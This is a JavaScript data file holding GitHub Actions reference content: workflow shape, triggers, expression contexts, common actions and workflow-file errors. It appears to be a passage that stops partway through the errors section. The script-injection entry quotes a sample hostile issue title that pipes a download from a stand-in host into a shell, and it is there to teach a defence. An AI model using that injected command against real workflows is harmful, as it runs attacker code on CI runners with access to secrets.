'use strict';

/*
  gha-ref.js — five GitHub Actions reference pages: concepts, triggers
  (events), expressions (contexts), common actions and errors.

  Same shape as jk-ref.js. A group with a `kind` shows its examples as a plain
  code block. A literal GitHub expression ${{ ... }} is written @{{ ... }}
  here, and turned back by fix(), so JavaScript does not try to fill it in.
*/

const ghaY = (s) => s.replace(/@\{\{/g, '${{');
// Turn @{{ back into ${{ in every text field of every entry.
const ghaDeep = (x) => (typeof x === 'string' ? ghaY(x) : Array.isArray(x) ? x.map(ghaDeep) : x && typeof x === 'object' ? Object.fromEntries(Object.entries(x).map(([k, v]) => [k, ghaDeep(v)])) : x);
const fix = (commands) => ghaDeep(commands);

/* ===================================================================== *
 *  Concepts
 * ===================================================================== */

const GHA_CONCEPT_WORDS = [
  ['Workflow', 'One YAML file in .github/workflows. It says when to run and what to do.'],
  ['Event', 'Something that happens in your repository, such as a push. A workflow starts on an event.'],
  ['Job', 'A group of steps that run together on one machine. Jobs run side by side unless you say otherwise.'],
  ['Step', 'One command, or one ready-made action, inside a job. Steps run in order.'],
  ['Runner', 'The machine that runs a job. GitHub gives you a fresh one each time and deletes it afterwards.'],
  ['Action', 'A ready-made, reusable step that someone wrote, such as actions/checkout.'],
  ['Secret', 'A hidden value, such as a password, stored in the repository settings. Workflows read it, but its value is never shown in logs.'],
];

const GHA_CONCEPT_GROUPS = [
  {
    id: 'shape',
    tool: 'The shape',
    kind: 'yaml',
    title: 'The shape of a workflow',
    blurb: 'Every workflow has the same three parts: a name, when to run, and the jobs. Learn the shape once and every workflow reads the same way.',
    commands: fix([
      {
        id: 'minimal',
        cmd: `name: Hello
on: push
jobs:
  say-hello:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Hello from GitHub"`,
        title: 'The smallest workflow',
        what: 'A complete workflow. Every time someone pushes, GitHub starts a machine and prints a line.',
        use: 'A good first file to try. Save it as .github/workflows/hello.yml, push it, and watch the Actions tab.',
        parts: [['name', 'The label shown in the Actions tab.'], ['on', 'The event that starts it. push means "someone pushed commits".'], ['jobs', 'The list of jobs. Here there is one, called say-hello.'], ['runs-on', 'The kind of machine for this job.'], ['steps', 'What the job does, in order.'], ['run', 'A shell command to run.']],
        tips: ['The file must be in .github/workflows and end in .yml or .yaml, or GitHub ignores it.', 'YAML uses spaces for indentation, never tabs. Two spaces per level is the habit.'],
      },
      {
        id: 'uses',
        cmd: `steps:
  - uses: actions/checkout@v6
  - run: ls -la`,
        title: 'run and uses',
        what: 'A step does one of two things. run types a shell command. uses runs a ready-made action.',
        use: 'Almost every job starts with uses: actions/checkout, because a fresh machine has no copy of your code.',
        parts: [['uses', 'Run a ready-made action. The part after @ is its version.'], ['actions/checkout', 'The owner and the name of the action, as on github.com.'], ['@v6', 'The version. v6 means "the latest 6.x".'], ['run', 'Type this command in a shell.']],
        tips: ['Without checkout, ls shows an empty folder.'],
      },
      {
        id: 'name',
        cmd: `steps:
  - name: Install packages
    run: npm ci
  - name: Run the tests
    run: npm test`,
        title: 'Naming steps',
        what: 'A name gives a step a readable label in the log.',
        use: 'Name any step that is not obvious, so a failed run tells you in plain words where it stopped.',
        parts: [['name', 'The label shown on the run page.'], ['run', 'The command.']],
        tips: ['Without a name, GitHub shows the command or action itself.'],
      },
      {
        id: 'needs',
        cmd: `jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo testing
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: echo deploying`,
        title: 'Job order: needs',
        what: 'Jobs run at the same time unless one says needs. Then it waits for the other, and is skipped if the other fails.',
        use: 'Put deploy after test, so a broken build never goes live.',
        parts: [['needs: test', 'Wait for the job called test. If test fails, deploy does not run.'], ['(no needs)', 'The job starts at once, in parallel with the others.']],
        tips: ['needs can be a list: needs: [build, lint].'],
      },
      {
        id: 'env',
        cmd: `env:
  NODE_ENV: test
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      CI: "true"
    steps:
      - run: echo $NODE_ENV $CI`,
        title: 'Environment variables: env',
        what: 'env sets variables that commands can read. It can sit on the whole workflow, one job, or one step.',
        use: 'Settings that several steps share, or values a tool reads from its environment.',
        parts: [['env (top)', 'Visible to every job.'], ['env (in a job)', 'Visible to that job only.'], ['$NODE_ENV', 'How a shell command reads the value.']],
        tips: ['The closest env wins when the same name is set twice.', 'Never put a secret in env as plain text. Read it from secrets instead.'],
      },
      {
        id: 'runner',
        cmd: `runs-on: ubuntu-latest
# or: windows-latest
# or: macos-latest`,
        title: 'Runners: runs-on',
        what: 'Picks the operating system of the machine that runs the job.',
        use: 'Use ubuntu-latest unless you need to test on Windows or macOS. Linux is the fastest and cheapest.',
        parts: [['ubuntu-latest', 'A Linux machine. Cheapest.'], ['windows-latest', 'Windows. Costs more minutes on private repositories.'], ['macos-latest', 'macOS. Costs the most minutes.']],
        tips: ['"latest" moves forward over time. Write a version, such as ubuntu-24.04, if you need it to stay the same.'],
      },
    ]),
  },
  {
    id: 'sharing',
    tool: 'Sharing data',
    kind: 'yaml',
    title: 'Sharing data between steps and jobs',
    blurb: 'Each job has its own machine, so files and values do not carry over by themselves. These are the ways to pass them on.',
    commands: fix([
      {
        id: 'output',
        cmd: `steps:
  - id: version
    run: echo "tag=v1.2.3" >> "$GITHUB_OUTPUT"
  - run: echo "Building @{{ steps.version.outputs.tag }}"`,
        title: 'Step outputs',
        what: 'A step can save a value. A later step in the same job reads it.',
        use: 'Work out something once, such as a version number, and use it in several steps.',
        parts: [['id: version', 'A name for the step, so others can point at it.'], ['>> "$GITHUB_OUTPUT"', 'Appends name=value to a special file. GitHub reads it after the step.'], ['steps.version.outputs.tag', 'How a later step reads the saved value.']],
        tips: ['Older guides use ::set-output. That is retired. Use $GITHUB_OUTPUT.'],
      },
      {
        id: 'joboutput',
        cmd: `jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      tag: @{{ steps.version.outputs.tag }}
    steps:
      - id: version
        run: echo "tag=v1.2.3" >> "$GITHUB_OUTPUT"
  show:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "@{{ needs.build.outputs.tag }}"`,
        title: 'Job outputs',
        what: 'A job can pass a value to a job that needs it.',
        use: 'The build job works out the version, and the deploy job uses it.',
        parts: [['outputs (in a job)', 'Names the values this job hands on.'], ['needs.build.outputs.tag', 'How the later job reads it.']],
        tips: ['The later job must list the earlier one under needs.'],
      },
      {
        id: 'artifact',
        cmd: `- uses: actions/upload-artifact@v6
  with:
    name: build-output
    path: dist`,
        title: 'Artifacts',
        what: 'Saves files from a job. You can download them from the run page, or another job can fetch them.',
        use: 'Keep a build result, a test report or a log for later.',
        parts: [['name', 'The name of the saved bundle.'], ['path', 'The folder or file to save.']],
        tips: ['Artifacts are deleted after a while (90 days by default). Set retention-days to keep them shorter.', 'To use one in another job, add actions/download-artifact there.'],
      },
      {
        id: 'cache',
        cmd: `- uses: actions/cache@v5
  with:
    path: ~/.npm
    key: npm-@{{ hashFiles('package-lock.json') }}`,
        title: 'Cache',
        what: 'Remembers a folder between runs, so downloads are not repeated.',
        use: 'Speed up installs. Most setup-* actions can do this for you with a cache: line.',
        parts: [['path', 'The folder to remember.'], ['key', 'A label for the saved copy. When the lock file changes, the label changes, and a fresh copy is made.'], ['hashFiles(...)', 'A short fingerprint of a file.']],
        tips: ['A cache is a speed-up, never a place for important results. It can disappear.'],
      },
    ]),
  },
  {
    id: 'control',
    tool: 'Control',
    kind: 'yaml',
    title: 'Controlling when things run',
    blurb: 'Skip a step, run a step even after a failure, or stop a job from running too long.',
    commands: fix([
      {
        id: 'if',
        cmd: `- name: Deploy
  if: github.ref == 'refs/heads/main'
  run: ./deploy.sh`,
        title: 'if: run only sometimes',
        what: 'A step or job with if runs only when the condition is true.',
        use: 'Deploy only from the main branch, even though the workflow also runs on pull requests.',
        parts: [['if', 'The condition. You do not need @{{ }} around it.'], ['github.ref', 'The branch or tag that started the run.'], ['==', 'Equals.']],
        tips: ['Inside if, strings use single quotes.'],
      },
      {
        id: 'always',
        cmd: `- name: Save the logs
  if: always()
  run: cat test.log`,
        title: 'always() and failure()',
        what: 'Normally a failed step stops the job. if: always() runs a step anyway, and if: failure() runs it only after a failure.',
        use: 'Upload a log or send a message even when the tests failed.',
        parts: [['always()', 'Run whatever happened before.'], ['failure()', 'Run only if an earlier step failed.'], ['success()', 'The default: run only if everything so far worked.']],
      },
      {
        id: 'timeout',
        cmd: `jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15`,
        title: 'timeout-minutes',
        what: 'Stops the job if it runs longer than this.',
        use: 'A stuck job otherwise runs for up to 6 hours and uses your free minutes.',
        parts: [['timeout-minutes', 'The limit in minutes. Put it on every job.']],
      },
      {
        id: 'continue',
        cmd: `- name: Optional check
  continue-on-error: true
  run: npm run lint`,
        title: 'continue-on-error',
        what: 'The step may fail without failing the job.',
        use: 'A check you want to see, but that should not block a merge yet.',
        parts: [['continue-on-error: true', 'A red cross on this step, but the job carries on and can still be green.']],
        careful: 'It is easy to forget. A check that always "passes" protects nothing.',
      },
      {
        id: 'concurrency',
        cmd: `concurrency:
  group: @{{ github.workflow }}-@{{ github.ref }}
  cancel-in-progress: true`,
        title: 'concurrency',
        what: 'Allows only one run per group at a time.',
        use: 'Cancel an old run when a new push arrives, or make deploys wait their turn.',
        parts: [['group', 'A label. Runs with the same label share the single slot.'], ['cancel-in-progress', 'true cancels the older run. false makes the new one wait.']],
        tips: ['For deploys, use false, so a deploy is never cut off halfway.'],
      },
    ]),
  },
];

/* ===================================================================== *
 *  Triggers
 * ===================================================================== */

const GHA_TRIGGER_WORDS = [
  ['Event', 'Something that happens in the repository. Workflows start on events.'],
  ['Branch filter', 'A list of branches that narrows an event, such as push only on main.'],
  ['Tag', 'A named label on a commit, usually a version such as v1.2.0.'],
  ['Default branch', 'The branch GitHub treats as the main one, usually main. Scheduled workflows run from it.'],
  ['Fork', 'A copy of a repository owned by someone else. Pull requests from forks get fewer permissions, for safety.'],
];

const GHA_TRIGGER_GROUPS = [
  {
    id: 'code',
    tool: 'Code events',
    kind: 'yaml',
    title: 'When code changes',
    blurb: 'The events most workflows use: someone pushes, or opens a pull request.',
    commands: fix([
      {
        id: 'push',
        cmd: `on:
  push:
    branches: [main]
    paths: ["src/**"]`,
        title: 'push',
        what: 'Starts when commits are pushed.',
        use: 'Run tests or deploy after changes reach a branch.',
        parts: [['push', 'The event.'], ['branches', 'Only these branches. Patterns like release/* work too.'], ['paths', 'Only when a changed file matches. Here, anything under src/.']],
        tips: ['Without branches, a push to any branch runs it.', 'A workflow-file change also needs a path match, or paths will skip it.'],
      },
      {
        id: 'pr',
        cmd: `on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]`,
        title: 'pull_request',
        what: 'Starts when a pull request is opened or updated.',
        use: 'Run tests on proposed changes before anyone merges them.',
        parts: [['branches', 'Only pull requests that aim at these branches.'], ['types', 'Which actions count. This list is the default: opened, synchronize (new commits) and reopened.']],
        tips: ['Pull requests from forks run with a read-only token and no secrets. That is on purpose.'],
      },
      {
        id: 'prtarget',
        cmd: `on:
  pull_request_target:
    types: [opened]`,
        title: 'pull_request_target',
        what: 'Like pull_request, but it runs from the base branch and has secrets and write access, even for pull requests from forks.',
        use: 'Rare: labelling or commenting on pull requests from strangers.',
        parts: [['pull_request_target', 'Runs your workflow as written on the target branch, not the contributor’s version.']],
        careful: 'Never check out and run the pull request’s code in this kind of workflow. A stranger’s code would then run with your secrets. Many real attacks use exactly this mistake.',
      },
      {
        id: 'tags',
        cmd: `on:
  push:
    tags: ["v*"]`,
        title: 'Tags',
        what: 'Starts when a tag matching the pattern is pushed.',
        use: 'Make a release when you push v1.2.0.',
        parts: [['tags', 'A list of tag patterns.'], ['v*', '* matches any characters, so v1.2.0 and v2 both match.']],
        tips: ['Create a tag with git tag v1.2.0, then send it with git push origin v1.2.0.'],
      },
      {
        id: 'branchignore',
        cmd: `on:
  push:
    branches-ignore: ["docs/**"]`,
        title: 'branches-ignore',
        what: 'Starts on every branch except those listed.',
        use: 'Skip branches where CI is not needed.',
        parts: [['branches-ignore', 'The branches to leave out.']],
        tips: ['You cannot use branches and branches-ignore for the same event.'],
      },
    ]),
  },
  {
    id: 'other',
    tool: 'Other events',
    kind: 'yaml',
    title: 'Timers, buttons and other events',
    blurb: 'Not every workflow starts from code. Some run on a clock, by hand, or when another workflow ends.',
    commands: fix([
      {
        id: 'schedule',
        cmd: `on:
  schedule:
    - cron: "0 2 * * *"`,
        title: 'schedule',
        what: 'Starts at set times, written as a cron expression.',
        use: 'A nightly audit, a weekly cleanup, a regular website check.',
        parts: [['0', 'Minute 0.'], ['2', 'Hour 2 (UTC).'], ['* (day of month)', 'Every day of the month.'], ['* (month)', 'Every month.'], ['* (day of week)', 'Every day of the week. 1 is Monday.']],
        tips: ['Times are UTC. India is UTC+5:30.', 'It runs only on the default branch, may start a few minutes late, and is paused after 60 days without repository activity.'],
      },
      {
        id: 'dispatch',
        cmd: `on:
  workflow_dispatch:
    inputs:
      reason:
        description: "Why are you running this?"
        required: false
        default: "manual run"`,
        title: 'workflow_dispatch',
        what: 'Adds a "Run workflow" button to the Actions tab. You can add a form that asks for values first.',
        use: 'Deploy on demand, or test a scheduled job without waiting for it.',
        parts: [['workflow_dispatch', 'Turns the button on.'], ['inputs', 'Optional form fields.'], ['required', 'Whether the field must be filled in.'], ['default', 'The value if you leave it empty.']],
        tips: ['Read an input in a step with @{{ inputs.reason }}. Put it in an env variable first when a shell command uses it.'],
      },
      {
        id: 'release',
        cmd: `on:
  release:
    types: [published]`,
        title: 'release',
        what: 'Starts when a release is published, edited or deleted.',
        use: 'Publish a package after you press Publish on a draft release.',
        parts: [['types: [published]', 'Only when a release goes public.']],
      },
      {
        id: 'workflowrun',
        cmd: `on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]`,
        title: 'workflow_run',
        what: 'Starts when another workflow finishes.',
        use: 'Deploy only after the CI workflow has passed, as a separate file.',
        parts: [['workflows', 'The names of the workflows to wait for.'], ['types: [completed]', 'Run when it ends, pass or fail. Check the result inside.']],
        tips: ['Inside the job, check github.event.workflow_run.conclusion == \'success\' before deploying.'],
      },
      {
        id: 'issues',
        cmd: `on:
  issues:
    types: [opened]
  issue_comment:
    types: [created]`,
        title: 'issues and issue_comment',
        what: 'Start when an issue is opened, or someone comments.',
        use: 'Label new issues, or react to a command typed in a comment.',
        parts: [['issues', 'Issue events.'], ['issue_comment', 'Comments on issues and on pull requests.']],
        careful: 'Issue titles and comments are text from strangers. Never paste them straight into a run: line. See the Expressions page.',
      },
      {
        id: 'call',
        cmd: `on:
  workflow_call:
    inputs:
      node:
        type: string
        default: "22"`,
        title: 'workflow_call',
        what: 'Makes this workflow reusable: other workflows can call it like a function.',
        use: 'Keep one shared test recipe and call it from many repositories.',
        parts: [['workflow_call', 'Marks the workflow as callable.'], ['inputs', 'Values the caller passes in.']],
        tips: ['A caller uses it with: uses: owner/repo/.github/workflows/test.yml@main'],
      },
    ]),
  },
];

/* ===================================================================== *
 *  Expressions and contexts
 * ===================================================================== */

const GHA_EXPR_WORDS = [
  ['Expression', 'Text inside ${{ }}. GitHub works it out and puts the result in the file.'],
  ['Context', 'A named bundle of information you can read in an expression, such as github (about the run) or secrets (your hidden values).'],
  ['Injection', 'An attack where text from a stranger is treated as a command. Pasting an issue title into a run line is one way.'],
  ['Masking', 'GitHub hides the value of every secret in the logs by replacing it with ***.'],
];

const GHA_EXPR_GROUPS = [
  {
    id: 'contexts',
    tool: 'Contexts',
    kind: 'yaml',
    title: 'Reading information about the run',
    blurb: 'Write @{{ context.name }} and GitHub fills in the value before the step runs.',
    commands: fix([
      {
        id: 'github',
        cmd: `- run: |
    echo "Branch: $REF"
    echo "Commit: $SHA"
    echo "Who: $ACTOR"
  env:
    REF: @{{ github.ref_name }}
    SHA: @{{ github.sha }}
    ACTOR: @{{ github.actor }}`,
        title: 'github',
        what: 'Facts about the run: the branch, the commit, who started it, which event.',
        use: 'Label images with the commit, or run a step only for one branch.',
        parts: [['github.ref_name', 'The short branch or tag name, such as main.'], ['github.ref', 'The full name, such as refs/heads/main.'], ['github.sha', 'The commit’s long ID.'], ['github.actor', 'The user who started the run.'], ['github.event_name', 'push, pull_request, schedule and so on.'], ['github.repository', 'owner/name of the repository.']],
        tips: ['The values go through env first, then the shell reads them as $REF. That is the safe pattern.'],
      },
      {
        id: 'secrets',
        cmd: `env:
  API_TOKEN: @{{ secrets.API_TOKEN }}`,
        title: 'secrets',
        what: 'Reads a secret you saved in the repository settings.',
        use: 'Passwords, tokens and keys. Never write them in the file.',
        parts: [['secrets.API_TOKEN', 'The secret named API_TOKEN. Names are case-insensitive but are written in capitals by habit.'], ['secrets.GITHUB_TOKEN', 'A token GitHub makes for every run. You do not create it.']],
        tips: ['GitHub replaces the value with *** in logs, but that is not a perfect shield. Do not print secrets on purpose.', 'Secrets are not passed to workflows triggered by pull requests from forks.'],
        careful: 'Never echo a secret, or put one in a command that is printed. Treat any secret that appears in a log as leaked, and replace it.',
      },
      {
        id: 'vars',
        cmd: `env:
  REGION: @{{ vars.REGION }}`,
        title: 'vars',
        what: 'Reads a configuration variable saved in the repository settings. Unlike a secret, it is shown in the logs.',
        use: 'Plain settings that change between repositories, such as a region name.',
        parts: [['vars.REGION', 'The variable named REGION, from Settings > Secrets and variables > Actions > Variables.']],
      },
      {
        id: 'matrixctx',
        cmd: `runs-on: @{{ matrix.os }}
steps:
  - run: echo "Testing on @{{ matrix.version }}"`,
        title: 'matrix',
        what: 'Inside a matrix job, reads this job’s own row of the matrix.',
        use: 'Use the right version or system for each combination.',
        parts: [['matrix.os', 'The system for this job.'], ['matrix.version', 'The version for this job.']],
      },
      {
        id: 'needsctx',
        cmd: `if: needs.build.result == 'success'`,
        title: 'needs',
        what: 'Reads the outcome and the outputs of the jobs this job waits for.',
        use: 'Act on what an earlier job produced, or on whether it passed.',
        parts: [['needs.build.result', 'success, failure, cancelled or skipped.'], ['needs.build.outputs.X', 'A value the build job saved as an output.']],
      },
      {
        id: 'envctx',
        cmd: `- run: echo "Mode is @{{ env.MODE }}"`,
        title: 'env and runner',
        what: 'env reads the variables you set. runner tells you about the machine.',
        use: 'Choose a command by operating system, or print a setting.',
        parts: [['env.MODE', 'A variable set with env:.'], ['runner.os', 'Linux, Windows or macOS.'], ['runner.temp', 'A temporary folder on the runner.']],
      },
    ]),
  },
  {
    id: 'functions',
    tool: 'Functions',
    kind: 'yaml',
    title: 'Functions and conditions',
    blurb: 'Small tools you can use inside an expression or an if.',
    commands: fix([
      {
        id: 'contains',
        cmd: `if: contains(github.ref_name, '-rc')`,
        title: 'contains, startsWith, endsWith',
        what: 'Test whether text contains, starts with, or ends with something.',
        use: 'Treat a tag such as v1.0.0-rc1 as a pre-release.',
        parts: [['contains(a, b)', 'True when a has b inside it.'], ['startsWith(a, b)', 'True when a begins with b.'], ['endsWith(a, b)', 'True when a ends with b.']],
        tips: ['These ignore capital letters.'],
      },
      {
        id: 'andor',
        cmd: `if: github.event_name == 'push' && github.ref == 'refs/heads/main'`,
        title: 'and, or, not',
        what: 'Combine conditions.',
        use: 'Deploy only for a push to main, not for a pull request.',
        parts: [['&&', 'And: both must be true.'], ['||', 'Or: either may be true.'], ['!', 'Not: flips true and false.']],
      },
      {
        id: 'hash',
        cmd: `key: deps-@{{ hashFiles('**/package-lock.json') }}`,
        title: 'hashFiles',
        what: 'A short fingerprint of one or more files.',
        use: 'Make a cache key that changes only when the lock file changes.',
        parts: [['hashFiles(...)', 'Reads the files that match the pattern.'], ['**', 'Any folder, at any depth.']],
      },
      {
        id: 'json',
        cmd: `- run: echo '@{{ toJSON(github.event) }}'`,
        title: 'toJSON and fromJSON',
        what: 'toJSON turns data into text so you can look at it. fromJSON does the reverse.',
        use: 'Debug: print everything GitHub knows about the event. fromJSON can build a matrix from a step’s output.',
        parts: [['toJSON(x)', 'Pretty-prints x as JSON.'], ['fromJSON(text)', 'Reads JSON text into data.']],
        careful: 'The event can contain text written by strangers. Print it for debugging only on your own private tests.',
      },
      {
        id: 'inject',
        cmd: `# Risky: the title is pasted into the command
- run: echo "@{{ github.event.issue.title }}"

# Safe: it goes through a variable
- run: echo "$TITLE"
  env:
    TITLE: @{{ github.event.issue.title }}`,
        title: 'Script injection (the safe way to use text from others)',
        what: 'GitHub fills in @{{ }} BEFORE the shell runs. If the text came from a stranger, it becomes part of your command.',
        use: 'Any time you use an issue title, a branch name, a pull request title or a comment in a run: line.',
        parts: [['Risky version', 'A title such as "; curl evil.sh | sh #" turns into a real command on your runner.'], ['Safe version', 'The text goes into an environment variable. The shell treats it as plain text, not as code.']],
        careful: 'This is one of the most common GitHub Actions security mistakes. Names you do not control (branches from forks, titles, comments, labels) always go through env.',
      },
    ]),
  },
];

/* ===================================================================== *
 *  Common actions
 * ===================================================================== */

const GHA_ACT_WORDS = [
  ['Action', 'A reusable step someone wrote. You use it with uses: owner/name@version.'],
  ['Marketplace', 'The directory of actions at github.com/marketplace. Anyone can publish one.'],
  ['Pinning', 'Writing the exact version of an action. @v6 follows the 6.x line. A full commit ID is the strictest pin.'],
  ['with', 'The settings you hand to an action, written under the with: key.'],
];

const GHA_ACT_GROUPS = [
  {
    id: 'basics',
    tool: 'Basics',
    kind: 'yaml',
    title: 'Get the code and install languages',
    blurb: 'The actions almost every workflow starts with. Version numbers move forward over time, so check each action’s page for the newest one. The Security generator makes a Dependabot file that does this for you.',
    commands: fix([
      {
        id: 'checkout',
        cmd: `- uses: actions/checkout@v6
  with:
    fetch-depth: 0`,
        title: 'actions/checkout',
        what: 'Copies your repository onto the runner.',
        use: 'The first step of nearly every job. A fresh machine starts empty.',
        parts: [['uses: actions/checkout', 'The action.'], ['fetch-depth: 0', 'Download the full history. The default is the latest commit only, which is faster.']],
        tips: ['You only need fetch-depth: 0 for things that read history, such as release notes or version tools.'],
      },
      {
        id: 'node',
        cmd: `- uses: actions/setup-node@v6
  with:
    node-version: "22"
    cache: npm`,
        title: 'actions/setup-node',
        what: 'Installs Node.js, and can cache npm downloads.',
        use: 'Any JavaScript or TypeScript project.',
        parts: [['node-version', 'Which Node.js to install.'], ['cache: npm', 'Reuse downloaded packages between runs.']],
      },
      {
        id: 'python',
        cmd: `- uses: actions/setup-python@v6
  with:
    python-version: "3.13"
    cache: pip`,
        title: 'actions/setup-python',
        what: 'Installs Python, and can cache pip downloads.',
        use: 'Any Python project.',
        parts: [['python-version', 'Which Python to install. Keep it in quotes.'], ['cache: pip', 'Reuse downloaded packages between runs.']],
        tips: ['Write "3.10" with quotes. Without them YAML reads it as the number 3.1.'],
      },
      {
        id: 'java',
        cmd: `- uses: actions/setup-java@v5
  with:
    distribution: temurin
    java-version: "21"
    cache: maven`,
        title: 'actions/setup-java',
        what: 'Installs Java, and can cache Maven or Gradle downloads.',
        use: 'Java and Kotlin projects.',
        parts: [['distribution', 'Which Java build. temurin is the free Eclipse build.'], ['java-version', 'Which Java version.'], ['cache', 'maven or gradle.']],
      },
      {
        id: 'go',
        cmd: `- uses: actions/setup-go@v6
  with:
    go-version: "1.25"`,
        title: 'actions/setup-go',
        what: 'Installs Go. It caches modules by itself.',
        use: 'Go projects.',
        parts: [['go-version', 'Which Go version.']],
      },
    ]),
  },
  {
    id: 'files',
    tool: 'Files',
    kind: 'yaml',
    title: 'Save and share files',
    blurb: 'Keep results from a run, or fetch them in another job.',
    commands: fix([
      {
        id: 'upload',
        cmd: `- uses: actions/upload-artifact@v6
  with:
    name: test-report
    path: reports/
    retention-days: 7`,
        title: 'actions/upload-artifact',
        what: 'Saves files from the run. You download them from the run page.',
        use: 'Test reports, build output, screenshots of a failed test.',
        parts: [['name', 'The name of the saved bundle.'], ['path', 'What to save.'], ['retention-days', 'How long GitHub keeps it.']],
        tips: ['Two uploads in one run cannot share the same name.'],
      },
      {
        id: 'download',
        cmd: `- uses: actions/download-artifact@v8
  with:
    name: test-report`,
        title: 'actions/download-artifact',
        what: 'Fetches an artifact that an earlier job saved.',
        use: 'Build in one job, then test or deploy the result in another.',
        parts: [['name', 'The bundle to fetch.']],
        tips: ['The two jobs run on different machines. This is how files cross between them.'],
      },
      {
        id: 'cachea',
        cmd: `- uses: actions/cache@v5
  with:
    path: ~/.cache/pip
    key: pip-@{{ hashFiles('requirements.txt') }}`,
        title: 'actions/cache',
        what: 'Saves a folder between runs.',
        use: 'When a setup-* action has no cache option for your tool.',
        parts: [['path', 'The folder to save.'], ['key', 'The label. A new label means a fresh copy.']],
      },
    ]),
  },
  {
    id: 'docker',
    tool: 'Docker',
    kind: 'yaml',
    title: 'Build and publish images',
    blurb: 'The actions published by Docker. They are used together in the Docker image generator.',
    commands: fix([
      {
        id: 'buildx',
        cmd: `- uses: docker/setup-buildx-action@v4`,
        title: 'docker/setup-buildx-action',
        what: 'Sets up Buildx, Docker’s modern builder.',
        use: 'Before docker/build-push-action. It adds caching and multi-platform builds.',
        parts: [['setup-buildx-action', 'No settings are needed for the usual case.']],
      },
      {
        id: 'login',
        cmd: `- uses: docker/login-action@v4
  with:
    registry: ghcr.io
    username: @{{ github.actor }}
    password: @{{ secrets.GITHUB_TOKEN }}`,
        title: 'docker/login-action',
        what: 'Signs in to a container registry so you can push an image.',
        use: 'Before pushing to GitHub’s registry or to Docker Hub.',
        parts: [['registry', 'ghcr.io for GitHub. Leave out for Docker Hub.'], ['username', 'Who you sign in as.'], ['password', 'A token from secrets, never a typed password.']],
        careful: 'Never write a password in the file. Always read it from secrets.',
      },
      {
        id: 'meta',
        cmd: `- id: meta
  uses: docker/metadata-action@v6
  with:
    images: ghcr.io/@{{ github.repository }}
    tags: |
      type=semver,pattern={{version}}
      type=sha`,
        title: 'docker/metadata-action',
        what: 'Works out the image name, tags and labels from the branch or tag.',
        use: 'So v1.2.3 becomes the image tag 1.2.3 without you writing the rule yourself.',
        parts: [['images', 'The image name, without a tag.'], ['type=semver', 'A tag from a version tag in git.'], ['type=sha', 'A tag from the commit ID.']],
      },
      {
        id: 'buildpush',
        cmd: `- uses: docker/build-push-action@v7
  with:
    context: .
    push: true
    tags: @{{ steps.meta.outputs.tags }}`,
        title: 'docker/build-push-action',
        what: 'Builds an image from a Dockerfile, and can push it.',
        use: 'The main step of any image workflow.',
        parts: [['context', 'The folder to build from.'], ['push', 'true to upload the image after the build.'], ['tags', 'The labels to give the image.']],
      },
    ]),
  },
  {
    id: 'pages',
    tool: 'Pages and CodeQL',
    kind: 'yaml',
    title: 'Publish a site and scan code',
    blurb: 'GitHub’s own actions for Pages and for security scanning.',
    commands: fix([
      {
        id: 'pagesup',
        cmd: `- uses: actions/upload-pages-artifact@v4
  with:
    path: dist`,
        title: 'actions/upload-pages-artifact',
        what: 'Packs a folder so GitHub Pages can publish it.',
        use: 'The build half of a Pages deploy.',
        parts: [['path', 'The folder that holds the finished site.']],
      },
      {
        id: 'pagesdep',
        cmd: `- id: deployment
  uses: actions/deploy-pages@v4`,
        title: 'actions/deploy-pages',
        what: 'Publishes the packed site.',
        use: 'The deploy half of a Pages deploy. It needs pages: write and id-token: write permissions.',
        parts: [['id: deployment', 'Lets you read the live address afterwards.']],
        tips: ['In Settings > Pages, set Source to GitHub Actions first.'],
      },
      {
        id: 'codeql',
        cmd: `- uses: github/codeql-action/init@v4
  with:
    languages: javascript-typescript
- uses: github/codeql-action/analyze@v4`,
        title: 'github/codeql-action',
        what: 'Scans your code for security bugs and posts the findings in the Security tab.',
        use: 'A free first line of defence on public repositories.',
        parts: [['init', 'Prepares the scan for the languages you name.'], ['analyze', 'Runs it and uploads the results.']],
        tips: ['Needs security-events: write permission.'],
      },
    ]),
  },
];

/* ===================================================================== *
 *  Errors
 * ===================================================================== */

const GHA_ERR_WORDS = [
  ['Exit code', 'A number a command returns when it ends. 0 means success. Anything else means failure.'],
  ['Annotation', 'A red or yellow message that GitHub shows at the top of a run, pointing to the line that caused it.'],
  ['Log', 'The text a step printed. Click a step on the run page to open it.'],
  ['Re-run', 'The button on a run page that starts the same run again. "Re-run failed jobs" repeats only what failed.'],
];

const GHA_ERR_GROUPS = [
  {
    id: 'file',
    tool: 'The file',
    kind: 'log',
    title: 'The workflow file is not accepted',
    blurb: 'These show at the top of a run, or the workflow never appears in the Actions tab.',
    commands: fix([
      {
        id: 'invalid',
        cmd: 'Invalid workflow file: .github/workflows/ci.yml#L9\nYAML syntax error on line 9',
        title: 'Invalid workflow file',
        what: 'GitHub could not read the file as YAML.',
        use: 'Almost always indentation: a tab, or a line with the wrong number of spaces.',
        parts: [['ci.yml#L9', 'The file and the line to look at.'], ['YAML syntax error', 'The structure is broken.']],
        tips: ['Use the Check my file page in Stanza. It finds this before you push.', 'Look at the line above too: a missing colon there is a common cause.'],
      },
      {
        id: 'nothing',
        cmd: '(the Actions tab shows no run at all after a push)',
        title: 'The workflow never starts',
        what: 'GitHub did not find, or did not match, your workflow.',
        use: 'You pushed and nothing happened.',
        parts: [['Wrong folder', 'It must be exactly .github/workflows/ (with the dot).'], ['Wrong branch', 'The on: filter does not match the branch you pushed to.'], ['Wrong event', 'A pull_request workflow does not run on a plain push.'], ['paths filter', 'None of the changed files matched.']],
        tips: ['A scheduled workflow only runs from the default branch.'],
      },
      {
        id: 'unexpected',
        cmd: "Unexpected value 'runs_on'\nThe workflow is not valid. .github/workflows/ci.yml (Line: 8, Col: 5): Unexpected value 'runs_on'",
        title: 'Unexpected value',
        what: 'A key is spelled wrongly. GitHub uses hyphens, such as runs-on and timeout-minutes.',
        use: 'Typed runs_on, runs on or Runs-On.',
        parts: [['Unexpected value', 'GitHub does not know this key.'], ['Line: 8, Col: 5', 'Where it is.']],
        tips: ['Keys are case-sensitive and use hyphens, not underscores. The exception is events, which use underscores: pull_request.'],
      },
